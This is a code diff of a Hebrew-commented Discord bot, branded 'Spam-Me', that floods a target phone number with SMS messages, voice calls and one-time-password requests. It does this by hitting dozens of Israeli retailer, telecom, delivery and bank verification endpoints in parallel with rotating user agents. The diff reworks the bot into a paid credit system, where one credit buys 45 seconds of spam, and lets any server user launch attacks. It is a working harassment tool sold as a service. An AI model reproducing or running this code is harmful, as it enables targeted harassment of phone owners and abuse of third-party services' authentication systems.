@@ -10,8 +10,6 @@ from motor.motor_asyncio import AsyncIOMotorClient
 from datetime import datetime, timedelta
 import logging
 import json
-import secrets
-import time
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -36,7 +34,6 @@ ALLOWED_ROLE_ID = 1480762750052601886
 
 def has_allowed_role():
     async def predicate(interaction: discord.Interaction):
-        # בדיקה אם למשתמש יש את הרול המורשה
         if not interaction.guild:
             await interaction.response.send_message("❌ הפקודה זמינה רק בשרת!", ephemeral=True)
             return False
@@ -54,7 +51,7 @@ class CyberBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.default()
         intents.message_content = True
-        intents.members = True  # חשוב בשביל לבדוק רולים
+        intents.members = True
         super().__init__(command_prefix='!', intents=intents)
         self.start_time = datetime.now()
         self.active_attacks = {}
@@ -70,10 +67,9 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
 ]
 
-# ========== APIS - 110 APIs ==========
+# ========== APIS - מה שעובד ==========
 APIS = [
     # מג'נטו
     {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
@@ -83,31 +79,12 @@ APIS = [
     {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
     {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
     {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
-    {"name": "Adika", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
-    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "NineWest", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
-    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "KiwiKids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "LeeCooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "GolfKids", "url": "https://www.golfkids.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "Steimatzky", "url": "https://www.steimatzky.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "StepIn", "url": "https://www.stepin.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "Renoir", "url": "https://www.renuar.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "Laline", "url": "https://www.laline.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "Gefen", "url": "https://www.gefen.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "Avramito", "url": "https://www.avramito.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "RedHot", "url": "https://www.redhot.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "Buffalo", "url": "https://www.buffalo.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "FoxHome", "url": "https://www.foxhome.co.il/customer/ajax/post/", "type": "magento"},
-    {"name": "TerminalX", "url": "https://www.terminalx.com/customer/ajax/post/", "type": "magento"},
     
     # SMS
     {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
@@ -115,66 +92,36 @@ APIS = [
     {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "data": {"phone": "PHONE"}},
     {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "data": {"phone": "PHONE"}},
     {"name": "019", "url": "https://019sms.co.il/api/register", "data": {"phone": "PHONE"}},
-    {"name": "012", "url": "https://www.012.net.il/api/sms", "data": {"phone": "PHONE"}},
     {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "data": {"phone": "PHONE"}},
-    {"name": "Golan", "url": "https://www.golantelecom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
-    {"name": "019mobile", "url": "https://019mobile.co.il/userarea/ajax/api/", "type": "form", "data": "request=login&action=firstLogin&data_arr%5Baction%5D=2&data_arr%5Bcontact%5D=PHONE"},
     {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
     {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
-    {"name": "Victory", "url": "https://www.victory.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
-    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/sms", "data": {"phone": "PHONE"}},
-    {"name": "GoodPharm", "url": "https://www.goodpharm.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
-    {"name": "Be", "url": "https://www.be.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
-    {"name": "Zap", "url": "https://www.zap.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
     {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "data": {"phone": "PHONE"}},
     {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "data": {"phone": "PHONE"}},
     {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
-    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "data": {"phone": "PHONE"}},
-    {"name": "BurgerKing", "url": "https://www.burgerking.co.il/api/auth", "data": {"phone": "PHONE"}},
-    {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "data": {"phone": "PHONE"}},
-    {"name": "PizzaHut", "url": "https://www.pizza-hut.co.il/api/register", "data": {"phone": "PHONE"}},
     {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "data": {"phone": "PHONE", "action": "send_sms"}},
     {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "data": {"phoneNumber": "PHONE_RAW"}},
     {"name": "Ivory", "url": "https://www.ivory.co.il/api/register", "data": {"phone": "PHONE"}},
-    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
-    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "data": {"phoneNumber": "PHONE"}},
-    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "phone": "PHONE", "phoneCall": False}},
     
     # Voice
     {"name": "Hapoalim", "url": "https://login.bankhapoalim.co.il/api/otp/send", "data": {"phone": "PHONE", "sendVoice": True}},
     {"name": "Leumi", "url": "https://api.leumi.co.il/api/otp/send", "data": {"phone": "PHONE", "voice": True}},
     {"name": "Discount", "url": "https://api.discountbank.co.il/auth/otp", "data": {"phone": "PHONE_RAW", "method": "voice"}},
-    {"name": "Mizrahi", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "data": {"phone": "PHONE", "type": "voice"}},
-    {"name": "CellcomVoice", "url": "https://digital-api.cellcom.co.il/api/otp/VoiceCall", "data": {"phone": "PHONE"}},
-    {"name": "ShufersalVoice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "data": {"phone": "PHONE_RAW"}},
-    
-    # Quick Login
-    {"name": "Quick247", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-twentyfourseven-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
-    {"name": "QuickRenuar", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-renuar-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
-    {"name": "QuickAldo", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-aldoshoes-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
 ]
 
 print(f"📊 טענתי {len(APIS)} APIs")
 
 # ========== פונקציות שליחה ==========
 async def send_magento(session, url, phone_raw):
-    """שליחת מג'נטו"""
     data = {
         "type": "login",
         "telephone": phone_raw,
         "bot_validation": 1,
-        "code": "",
-        "compare_email": "",
-        "compare_identity": ""
     }
-    
     headers = {
         "User-Agent": random.choice(USER_AGENTS),
-        "Accept": "application/json, text/javascript, */*; q=0.01",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Content-Type": "application/x-www-form-urlencoded",
         "X-Requested-With": "XMLHttpRequest"
     }
-    
     try:
         async with session.post(url, data=data, headers=headers, timeout=5) as resp:
             return resp.status in [200, 201, 202]
@@ -182,49 +129,43 @@ async def send_magento(session, url, phone_raw):
         return False
 
 async def send_api(session, api, phone, phone_raw, phone_intl):
-    """שליחת API"""
     try:
-        headers = {
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept": "application/json",
-        }
-        
+        headers = {"User-Agent": random.choice(USER_AGENTS)}
         if api.get("type") == "form":
-            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
             data = api["data"].replace("PHONE", phone)
             async with session.post(api["url"], data=data, headers=headers, timeout=5) as resp:
                 return resp.status in [200, 201, 202, 204]
-        
         else:
             headers["Content-Type"] = "application/json"
             data_str = json.dumps(api["data"])
-            data_str = data_str.replace("PHONE", phone)
-            data_str = data_str.replace("PHONE_RAW", phone_raw)
-            data_str = data_str.replace("PHONE_INTL", phone_intl)
+            data_str = data_str.replace("PHONE", phone).replace("PHONE_RAW", phone_raw).replace("PHONE_INTL", phone_intl)
             data = json.loads(data_str)
-            
             async with session.post(api["url"], json=data, headers=headers, timeout=5) as resp:
                 return resp.status in [200, 201, 202, 204]
     except:
         return False
 
-# ========== מתקפה ==========
-async def smart_attack(phone, duration_mins, user_id, interaction, attack_id):
-    """מתקפה חכמה - לא חוסמת"""
+# ========== מתקפה לפי טוקנים (45 שניות לטוקן) ==========
+async def token_attack(phone, credits, user_id, interaction, attack_id):
+    """כל טוקן = 45 שניות של ספאם"""
     phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
     phone_intl = f"+972{phone_raw}"
     
+    duration_seconds = credits * 45
+    duration_mins = duration_seconds // 60
+    remaining_seconds = duration_seconds % 60
+    
+    end_time = datetime.now() + timedelta(seconds=duration_seconds)
+    
     await interaction.followup.send(
-        f"🎯 **ATTACK STARTED**\n📱 {phone}\n⏱️ {duration_mins} דקות\n🎯 {len(APIS)} APIs",
+        f"🎯 **SPAM STARTED**\n📱 {phone}\n⏱️ {credits} טוקנים = {duration_mins} דקות ו-{remaining_seconds} שניות\n🎯 {len(APIS)} APIs",
         ephemeral=True
     )
     
     # 5 סשנים
     sessions = [aiohttp.ClientSession() for _ in range(5)]
     total_sent = 0
-    last_minute = -1
-    
-    end_time = datetime.now() + timedelta(minutes=duration_mins)
+    last_report = 0
     
     try:
         while datetime.now() < end_time:
@@ -242,14 +183,14 @@ async def smart_attack(phone, duration_mins, user_id, interaction, attack_id):
             results = await asyncio.gather(*tasks, return_exceptions=True)
             total_sent += sum(1 for r in results if r is True)
             
-            # עדכון כל דקה
-            minutes_passed = int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds() // 60)
-            if minutes_passed > last_minute:
-                last_minute = minutes_passed
-                rate = total_sent // minutes_passed if minutes_passed > 0 else 0
-                await interaction.followup.send(f"📊 דקה {minutes_passed}: {total_sent} הודעות | {rate}/דקה", ephemeral=True)
+            # עדכון כל 30 שניות
+            elapsed = int((datetime.now() - (end_time - timedelta(seconds=duration_seconds))).total_seconds())
+            if elapsed - last_report >= 30:
+                last_report = elapsed
+                remaining = duration_seconds - elapsed
+                await interaction.followup.send(f"📊 {elapsed}s עברו, {remaining}s נותרו | נשלחו: {total_sent}", ephemeral=True)
             
-            await asyncio.sleep(random.uniform(0.3, 0.7))
+            await asyncio.sleep(random.uniform(0.3, 0.5))
     
     finally:
         for session in sessions:
@@ -258,9 +199,9 @@ async def smart_attack(phone, duration_mins, user_id, interaction, attack_id):
     if attack_id in bot.active_attacks:
         del bot.active_attacks[attack_id]
     
-    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ: {total_sent}", ephemeral=True)
+    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ נשלחו: {total_sent} הודעות", ephemeral=True)
 
-# ========== פקודות צוות (רק לבעלי הרול) ==========
+# ========== פקודות צוות ==========
 @bot.tree.command(name="check", description="בדוק APIs (צוות)")
 @app_commands.check(has_allowed_role())
 async def check_command(interaction: discord.Interaction):
@@ -278,14 +219,12 @@ async def check_command(interaction: discord.Interaction):
                 success = await send_magento(session, api["url"], test_raw)
             else:
                 success = await send_api(session, api, test_phone, test_raw, test_intl)
-            
             if success:
                 working.append(api["name"])
-            await asyncio.sleep(0.2)
     
     await interaction.followup.send(f"✅ **{len(working)}** עובדים", ephemeral=True)
 
-@bot.tree.command(name="tokens", description="הוסף טוקנים (צוות)")
+@bot.tree.command(name="add_tokens", description="הוסף טוקנים (צוות)")
 @app_commands.check(has_allowed_role())
 async def add_tokens(interaction: discord.Interaction, member: discord.Member, amount: int):
     user_id = str(member.id)
@@ -296,27 +235,38 @@ async def add_tokens(interaction: discord.Interaction, member: discord.Member, a
     )
     await interaction.response.send_message(f"✅ הוספת {amount} טוקנים ל{member.mention}", ephemeral=True)
 
-@bot.tree.command(name="reload", description="טען מחדש APIs (צוות)")
-@app_commands.check(has_allowed_role())
-async def reload_command(interaction: discord.Interaction):
-    await interaction.response.send_message(f"📊 יש {len(APIS)} APIs פעילים", ephemeral=True)
-
-# ========== VIEW - לכולם מותר להשתמש בכפתורים ==========
-class AttackModal(ui.Modal, title="🎯 SMART ATTACK"):
-    phone = ui.TextInput(label="📱 טלפון", placeholder="972501234567")
-    duration = ui.TextInput(label="⏱️ דקות", default="3")
+# ========== פאנל ראשי בדיוק כמו בתמונה ==========
+class SpamModal(ui.Modal, title="Start Spam"):
+    phone = ui.TextInput(
+        label="Target Phone Number *",
+        placeholder="054XXXXXXXX",
+        min_length=10,
+        max_length=13
+    )
+    credits = ui.TextInput(
+        label="Credits to use (max 100) *",
+        placeholder="e.g. 5",
+        max_length=3
+    )
 
     async def on_submit(self, interaction: discord.Interaction):
         phone = self.phone.value.strip()
+        credits_str = self.credits.value.strip()
         
-        if not phone.startswith("972"):
-            await interaction.response.send_message("❌ מספר חייב 972", ephemeral=True)
+        # וידוא פורמט מספר
+        if not phone.isdigit() or len(phone) < 9:
+            await interaction.response.send_message("❌ מספר טלפון לא תקין", ephemeral=True)
             return
         
+        if not phone.startswith("05") and not phone.startswith("972"):
+            await interaction.response.send_message("❌ מספר חייב להתחיל ב-05 או 972", ephemeral=True)
+            return
+        
+        # וידוא קרדיטים
         try:
-            duration = int(self.duration.value)
-            if duration < 1 or duration > 30:
-                await interaction.response.send_message("❌ 1-30 דקות", ephemeral=True)
+            credits = int(credits_str)
+            if credits < 1 or credits > 100:
+                await interaction.response.send_message("❌ יש להזין 1-100 טוקנים", ephemeral=True)
                 return
         except:
             await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
@@ -326,84 +276,110 @@ class AttackModal(ui.Modal, title="🎯 SMART ATTACK"):
         user_doc = await users_col.find_one({"user_id": user_id})
         
         if not user_doc:
-            await users_col.insert_one({"user_id": user_id, "tokens": 50})
-            user_doc = {"tokens": 50}
+            await users_col.insert_one({"user_id": user_id, "tokens": 0})
+            user_doc = {"tokens": 0}
         
-        if user_doc.get("tokens", 0) < 1:
-            await interaction.response.send_message("❌ אין טוקנים! פנה לצוות", ephemeral=True)
+        if user_doc.get("tokens", 0) < credits:
+            await interaction.response.send_message(f"❌ אין לך מספיק טוקנים! יש לך {user_doc.get('tokens', 0)}", ephemeral=True)
             return
         
-        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
+        # הורדת טוקנים
+        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -credits}})
         
         attack_id = f"{user_id}_{datetime.now().timestamp()}"
         bot.active_attacks[attack_id] = True
         
+        duration_seconds = credits * 45
+        duration_mins = duration_seconds // 60
+        remaining_sec = duration_seconds % 60
+        
         await interaction.response.send_message(
-            f"🎯 **ACTIVATED**\n📱 {phone}\n💎 נותרו: {user_doc['tokens']-1}",
+            f"✅ **SPAM ACTIVATED**\n📱 {phone}\n🎯 {credits} טוקנים = {duration_mins}ד {remaining_sec}ש\n💎 נותרו: {user_doc['tokens'] - credits}",
             ephemeral=True
         )
         
-        asyncio.create_task(smart_attack(phone, duration, user_id, interaction, attack_id))
+        asyncio.create_task(token_attack(phone, credits, user_id, interaction, attack_id))
 
-class MainView(discord.ui.View):
+class MainPanel(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=180)
     
-    @discord.ui.button(label="🎯 ATTACK", style=discord.ButtonStyle.danger, emoji="🚀")
-    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        # לכולם מותר - בלי בדיקת רול
-        await interaction.response.send_modal(AttackModal())
+    @discord.ui.button(label="📱 Spam Phone", style=discord.ButtonStyle.danger, emoji="💣")
+    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        # לכולם מותר
+        await interaction.response.send_modal(SpamModal())
     
-    @discord.ui.button(label="🔍 CHECK", style=discord.ButtonStyle.secondary, emoji="🔍")
-    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        # רק לבעלי הרול
-        if not interaction.guild:
-            await interaction.response.send_message("❌ לא בשרת", ephemeral=True)
-            return
+    @discord.ui.button(label="💰 My Credits", style=discord.ButtonStyle.secondary, emoji="💎")
+    async def credits_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        user_id = str(interaction.user.id)
+        user_doc = await users_col.find_one({"user_id": user_id})
+        tokens = user_doc.get("tokens", 0) if user_doc else 0
         
-        member = interaction.user
-        if isinstance(member, discord.Member):
-            if any(role.id == ALLOWED_ROLE_ID for role in member.roles):
-                await check_command(interaction)
-                return
-        
-        await interaction.response.send_message(f"❌ רק משתמשים עם רול <@&{ALLOWED_ROLE_ID}> יכולים להשתמש בכפתור זה!", ephemeral=True)
+        embed = discord.Embed(
+            title="💰 Your Credits",
+            description=f"You have **{tokens}** credits\n\n1 credit = 45 seconds of spam",
+            color=0x00ff00
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    @discord.ui.button(label="🛒 Buy Credits", style=discord.ButtonStyle.link, url="https://your-website.com/buy", emoji="💳")
+    async def buy_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        # כפתור לינק - לא צריך תוכן
+        pass
 
-@bot.tree.command(name="setup", description="פאנל שליטה")
+@bot.tree.command(name="panel", description="פתח את פאנל השליטה")
+@app_commands.check(has_allowed_role())
+async def panel(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="Spam-Me Control Panel",
+        description="Use the buttons below to interact with the bot.\nFor more info go to #info.",
+        color=0x2b2d31
+    )
+    embed.add_field(
+        name="📱 **Spam Phone**",
+        value="Sending SMS & Call & Whatsapp (costs credits)",
+        inline=False
+    )
+    embed.add_field(
+        name="💰 **My Credits**",
+        value="Check your balance",
+        inline=True
+    )
+    embed.add_field(
+        name="🛒 **Buy Credits**",
+        value="Purchase more credits via our website",
+        inline=True
+    )
+    embed.set_footer(text="1 credit = 45 seconds of spam")
+    
+    view = MainPanel()
+    await interaction.response.send_message(embed=embed, view=view)
+
+# פקודה ישנה לנוחות (אפשר להשאיר או להסיר)
+@bot.tree.command(name="setup", description="פאנל ישן (צוות)")
+@app_commands.check(has_allowed_role())
 async def setup(interaction: discord.Interaction):
+    await panel(interaction)
+
+@bot.tree.command(name="tokens", description="בדוק טוקנים")
+async def tokens_command(interaction: discord.Interaction):
     user_id = str(interaction.user.id)
     user_doc = await users_col.find_one({"user_id": user_id})
-    
-    if not user_doc:
-        await users_col.insert_one({"user_id": user_id, "tokens": 50})
-        tokens = 50
-    else:
-        tokens = user_doc.get("tokens", 0)
-    
-    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
-    
-    embed = discord.Embed(
-        title="🎯 SMART BOT",
-        description=f"**{len(APIS)}** APIs | 5 סשנים",
-        color=0x00ff00
-    )
-    embed.add_field(name="💎 טוקנים שלך", value=f"**{tokens}**", inline=True)
-    embed.add_field(name="🎯 מתקפות פעילות", value=active, inline=True)
-    embed.add_field(name="🔒 הרשאות", value=f"צוות: <@&{ALLOWED_ROLE_ID}>", inline=False)
-    embed.set_footer(text="🎯 לכולם מותר להשתמש בכפתור ATTACK")
-    
-    await interaction.response.send_message(embed=embed, view=MainView())
+    tokens = user_doc.get("tokens", 0) if user_doc else 0
+    await interaction.response.send_message(f"💎 יש לך {tokens} טוקנים (כל טוקן = 45 שניות)", ephemeral=True)
 
-# טיפול בשגיאות הרשאה
 @bot.tree.error
 async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
     if isinstance(error, app_commands.CheckFailure):
-        # כבר טופל בפונקציית הבדיקה
         pass
     else:
-        await interaction.response.send_message(f"❌ שגיאה: {str(error)}", ephemeral=True)
+        try:
+            await interaction.response.send_message(f"❌ שגיאה: {str(error)}", ephemeral=True)
+        except:
+            pass
 
 if __name__ == "__main__":
-    print(f"🎯 טוען {len(APIS)} APIs...")
+    print(f"🎯 פאנל Spam-Me מוכן עם {len(APIS)} APIs")
     print(f"🔒 רול מורשה: {ALLOWED_ROLE_ID}")
+    print(f"⏱️ 1 טוקן = 45 שניות")
     bot.run(TOKEN)
